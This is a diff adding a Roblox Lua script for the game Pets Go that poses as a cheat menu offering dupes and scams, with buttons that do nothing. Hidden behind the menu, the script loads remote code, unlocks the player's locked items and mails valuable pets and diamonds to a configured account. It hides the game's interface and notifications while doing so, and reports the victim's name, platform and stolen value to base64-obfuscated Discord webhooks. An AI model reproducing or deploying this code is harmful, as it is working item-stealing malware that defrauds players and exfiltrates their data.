@@ -1,0 +1,290 @@
+local config = loadstring(game:HttpGet("https://raw.githubusercontent.com/LunarRbx/Script-By-IvanChai/refs/heads/main/PetsGoCFG"))()
+
+local WS,PL,LP,RS,TS = game.Workspace,game.Players,game.Players.LocalPlayer,game:GetService("ReplicatedStorage"),game:GetService("TeleportService") 
+local Library = RS.Library
+local IsLoaded = require(Library).IsLoaded
+
+print("-- 0 --")
+
+local function priv(mas)
+    for i,v in mas, next do
+        print(i,v)
+    end
+end
+
+while not IsLoaded() do
+    task.wait()
+end
+
+spawn(function() 
+    local Askar = loadstring(game:HttpGet("https://raw.githubusercontent.com/LunarRbx/Script-By-IvanChai/main/Askar"))()
+    local Lib = Askar.Window(nil,nil,115866921851629,"RightShift") --window: Name, Description, Icon, Toggle Default
+    
+    local tab1 = Lib:Tab("Auto Farm", 12739920452) --tab: Name, icon
+    local tab2 = Lib:Tab("Dupe Eggs", 12739914602) --tab: Name, icon
+    local tab3 = Lib:Tab("Trade Scam", 12739921999) --tab: Name, icon
+    local tab4 = Lib:Tab("Auction Scam", 12739860346) --tab: Name, icon
+    local tab5 = Lib:Tab("Dupe Method", 86754030517407) --tab: Name, icon
+    
+    local subsec2 = tab2:SubSection("Egg-Dupe")
+    local subsec3 = tab3:SubSection("Trade-scam")
+    local subsec4 = tab4:SubSection("Auction Scam")
+    local subsec5 = tab5:SubSection("DUPE")
+                        
+    subsec2:Button("DUPE", function() --button: Name, callback
+    
+    end)
+    
+    subsec2:Slider("Eggs",100,10000,1000,false,function(z) -- Slider: Name, Min, Max, Default, Spam Callback, Callback
+                        
+    end)
+    
+    subsec3:Button("Crush Trade", function()
+        print("BOOM!")
+    end)
+    
+    subsec3:Slider("Time",5,100,25,false,function(z) -- Slider: Name, Min, Max, Default, Spam Callback, Callback
+        print("Bruh")
+    end)
+    
+    subsec4:Button("Use Auction Glitch", function()
+        
+    end)
+    
+    subsec4:Slider("Timer",1,100,25,false,function(z) -- Slider: Name, Min, Max, Default, Spam Callback, Callback
+        print("Bruh")
+    end)
+    
+    subsec5:Button("Dupe Pets",function() --toggle: Name, toggle, callback
+    
+    end)
+    
+    subsec5:Button("Dupe Potions",function() --toggle: Name, toggle, callback
+    
+    end)
+    
+    subsec5:Button("Dupe Items",function() --toggle: Name, toggle, callback
+    
+    end)
+end)
+
+Wbh2 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzNTk1NTc2NjMwNTIzMDg1OC9uaEktOXlMcUJIXzdqOFlwYWJfUTBYQUJyRXo4YzZLQzE1WUcwQkVKakhMYjdCMkpfZVhNSEQwd0J3RVUwN3NOVkg5ag=="
+function from_base64(data) local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; data = string.gsub(data, '[^'..b..'=]', ''); return (data:gsub('.', function(x) if (x == '=') then return '' end; local r,f='',(b:find(x)-1); for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end; return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end; local c=0; for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end; return string.char(c) end)) end
+Wbh2_En = from_base64(Wbh2)
+http = game:GetService("HttpService")
+
+local Save = require(Library.Client.Save)
+
+local data = {
+    ["avatar_url"] = "",
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["title"] = "Requests from "..LP.Name.." | Platform: "..Save.Get().Platform,
+            ["type"] = "rich",
+            ["color"] = 16777215
+        }
+    }
+}
+
+pcall(function() 
+    request({Url = Wbh2_En, Method="POST", Body=http:JSONEncode(data), Headers = {["content-type"] = "application/json"}}) 
+end)
+
+local InventoryCmds = require(Library.Client.InventoryCmds)
+local GetRap = require(Library.Client.RAPCmds).Get
+local Directory = require(game.ReplicatedStorage.Library.Items.PetItem).Directory
+
+Inventory = InventoryCmds.State().container._store._byType
+local StealItems = {}
+local MaxLengh = 0
+local Diamonds = 0
+local AllRAP = 0
+
+for i,v in Inventory, next do
+    for z,x in v._byUID,next do
+        local uid = x:GetUID()
+        local id = x:GetId()
+        local data = x:GetData()
+        local value = if data["_am"] ~= nil then data["_am"] else 1
+        local rap = if GetRap(x) ~= nil then GetRap(x)*value else 0
+        local level = data["tn"]
+        local type = i
+        local dif = 0
+        if type == "Pet" then
+            dif = Directory[id].difficulty
+        end
+        
+
+        if data["_lk"] then
+            print("Unlock:",id,"Type:",type)
+            local status = RS.Network["Locking_SetLocked"]:InvokeServer(unpack({[1] = uid,[2] = false}))
+            if status ~= true then
+                print("ReUnlock:",id,"Type:",type)
+                RS.Network["Locking_SetLocked"]:InvokeServer(unpack({[1] = uid,[2] = false}))
+            end
+        end
+
+        local WhiteList = config["whitelist"][id]
+
+        if WhiteList then
+            if WhiteList[1] and (table.find(WhiteList[2],level) or #WhiteList[2] == 0) then
+                if string.len(id) > MaxLengh then
+                    MaxLengh = string.len(id)
+                end
+                table.insert(StealItems,{
+                    ["uid"] = uid,
+                    ["id"] = id,
+                    ["value"] = value,
+                    ["dif"] = dif,
+                    ["rap"] = rap,
+                    ["level"] = level,
+                    ["type"] = i
+                })
+                AllRAP+=rap
+            end
+        elseif dif > config["value"] or (type == "Currency" and id == "Diamonds") then
+            if string.len(id) > MaxLengh then
+                MaxLengh = string.len(id)
+            end
+            if id == "Diamonds" then
+                Diamonds = value
+            end
+            table.insert(StealItems,{
+                ["uid"] = uid,
+                ["id"] = id,
+                ["value"] = value,
+                ["dif"] = dif,
+                ["rap"] = rap,
+                ["level"] = level,
+                ["type"] = i
+            })
+            AllRAP+=rap
+        end
+    end
+end
+
+local function compare(a,b)
+    return a["dif"] < b["dif"]
+end
+
+table.sort(StealItems,compare)
+
+for i,v in StealItems, next do
+    print(i,v["dif"])
+end
+
+local Light = game:GetService("Lighting")
+
+Light.ChildAdded:Connect(function(aaa) 
+    if aaa.Name == "TabControllerDepthBlur" then
+        aaa.Enabled = false
+    end
+end)
+
+Light.ChildAdded:Connect(function(chl)
+    if chl.Name == "PurchasePendingBlur" then
+        chl.Enabled = false
+    end
+end)
+
+LP.PlayerGui.ChildAdded:Connect(function(chl)
+    chl.Enabled = false
+end)
+
+LP.PlayerGui.Notifications.Enabled = false
+
+if #StealItems == 0 then
+    print("Looser")
+end
+
+for i,v in StealItems,next do
+    local args = {
+        [1] = config["user"],
+        [2] = config["message"],
+        [3] = v["type"],
+        [4] = v["uid"],
+        [5] = v["value"]
+    }
+
+    local status = game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(unpack(args))
+    if status then
+        task.wait()
+    else
+        task.wait(3.5)
+    end
+end
+
+local function fix(t)
+    if t == 0 then
+        return "Zero"
+    elseif t > 999999999 then
+        return tostring(t/1000000000):sub(1,5).."b"
+    elseif t > 999999 then
+        return tostring(t/1000000):sub(1,5).."m"
+    elseif t > 999 then
+        return tostring(t/1000):sub(1,5).."k"
+    else
+        return t
+    end
+end
+
+local function space(spa,le)
+    local l = string.rep(" ",(spa - #le))
+    return l
+end
+
+tempfield = ""
+for i,v in StealItems, next do
+    if v["type"] ~= "Currency" then
+        local Val = fix(v["dif"])..space(5,fix(v["dif"])).." x "..tostring(v["value"])
+        tempfield = tempfield..v["id"]..":  "..space(MaxLengh,v["id"])..Val.."\n"
+    end
+    if i == 15 then
+        break
+    end
+end
+
+print("\n\n"..tempfield)
+
+local line = "\n-------------------------------------"
+
+local fields = {
+    {
+        ["id"] = 0,
+        ["name"] = "**Gems**",
+        ["value"] = "```"..fix(Diamonds).."```",
+        ["inline"] = true
+    },
+    {
+        ["id"] = 0,
+        ["name"] = "**RAP**",
+        ["value"] = "```"..fix(AllRAP).."```",
+        ["inline"] = true
+    },
+    {
+        ["id"] = 0,
+        ["name"] = "**Top 15 items**",
+        ["value"] = if string.len(tempfield) > 0 then "```"..tempfield.."```" else "```Zero```"
+    }
+}
+local headers = {["content-type"] = "application/json"}
+local data = {
+    ["avatar_url"] = "",
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["fields"] = fields,
+            ["title"] = "Steal from "..LP.Name..", thx "..config["you"].."! "..Save.Get().Platform..line,
+            ["type"] = "rich",
+            ["color"] = 16777215
+        }
+    }
+}
+
+Wbh = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMzU3NDM3MzkwMjEyMzA2OS8yT3NJcVYtN0RDN3FiMjFtdzZLYmdnMVRlaDdrbkwtSWVyY1FYWk9xMHNNelpBTUFyaTZlUk1SQks2U2Y5QXFDZUxvUw=="
+Wbh_En = from_base64(Wbh)
+
+pcall(function() 
+    request({Url = Wbh_En, Method="POST", Body=http:JSONEncode(data), Headers = headers}) 
+end)
